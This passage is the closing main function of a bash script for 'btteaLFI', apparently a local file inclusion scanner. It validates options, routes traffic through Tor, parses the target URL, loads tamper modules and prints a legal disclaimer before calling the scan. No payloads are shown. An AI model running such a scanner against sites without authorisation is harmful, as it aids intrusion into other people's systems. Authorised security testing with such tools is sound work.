        nc -vz ${temp[1]/\:/ }>/dev/null 2>&1
        [ "$?" != "0" ] && echo -e "[$(NOWTIME)] [${ERROR_RED}ERROR${END_COLOR}] Please check if your \"Tor\" is properly set or enabled." && exit
    fi

    # if not set taget, show this message
    [ "$WebsiteUrl" = "" ] && echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] The parameter setting is incomplete, please refer to \"--help\" for usage." && exit

    temp=(${WebsiteUrl/\?/ })

    # https://test.com/lfi.php?id=1&c=2  =>  https://test.com/lfi.php
    local WebPathAddress=${temp[0]}

    # https://test.com/lfi.php?id=1&c=2  =>  id=1&c=2
    local GetData=${temp[1]}

    # https://test.com/abc  =>  test.com
    local WebsiteDNS=${WebPathAddress/https:\/\//}
    WebsiteDNS=${WebsiteDNS/http:\/\//}
    WebsiteDNS=(${WebsiteDNS/\// })
    WebsiteDNS=${WebsiteDNS[0]}

    # Fool-proof inspection
    if [ "$OS" != "" ];then
        OS=${OS,,}
        if [ "$OS" != "linux" ] && [ "$OS" != "windows" ];then
            echo -e "[$(NOWTIME)] [${ERROR_RED}ERROR${END_COLOR}] \"OS\" parameter setting error" && exit
        fi
    fi

    # not set get and post parameter debug
    ([ "$GetData" = "" ] && [ "$PostData" = "" ]) && echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] nothing testable parameters." && exit

    # if have not exist parameter, show this massage
    for _check_getdata_ in $SpecifyParameter;do
        [ "`echo "$GetData $PostData" | grep "$_check_getdata_"`" = "" ] && echo -e "[$(NOWTIME)] [${ERROR_RED}ERROR${END_COLOR}] The specified parameter \"$_check_getdata_\" does not exist!" && exit
    done

    # --flush-session
    [ "$DeleteHistory" = "True" ] && rm -rf "report/$WebsiteDNS"

    # --skip and -p debug
    ([ "$SkipParameter" != "" ] && [ "$SpecifyParameter" != "" ]) && echo -e "[$(NOWTIME)] [${CRITICAL_BACKGROUND_RED}CRITICAL${END_COLOR}] option \"--skip\" is incompatible with option \"-p\"" && exit
    
    # TamperScript check
    local TamperScriptNumber=(${TamperScript//\,/ })
    local CheckScriptNotExist=""
    for ScriptName in ${TamperScriptNumber[@]};do
        [ ! -f "tamper/${ScriptName}.sh" ] && CheckScriptNotExist="${ScriptName}" && break
    done
    [ "$CheckScriptNotExist" != "" ] &&  echo -e "[$(NOWTIME)] [${CRITICAL_BACKGROUND_RED}CRITICAL${END_COLOR}] tamper script \"$CheckScriptNotExist\" does not exist" && exit
    for ScriptName in ${TamperScriptNumber[@]};do
        echo -e "[$(NOWTIME)] [${INFO_GREEN}INFO${END_COLOR}] loading tamper module \"$ScriptName\""
    done
    [ ${#TamperScriptNumber[@]} -ge 3 ] && echo -e "[$(NOWTIME)] [${WARNING_YELLOW}WARNING${END_COLOR}] using too many tamper scripts is usually not a good idea"


    echo "[!] legal disclaimer: Usage of btteaLFI for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"
    echo ""
    echo "[*] starting @ $(date "+%T") /$(date '+%Y-%m-%d')/"
    echo ""


    LFIscan "$WebsiteDNS" "$WebPathAddress" "$GetData" "$PostData"


    echo ""
    echo "[*] ending @ $(date "+%T") /$(date '+%Y-%m-%d')/"
    echo ""
}

main $@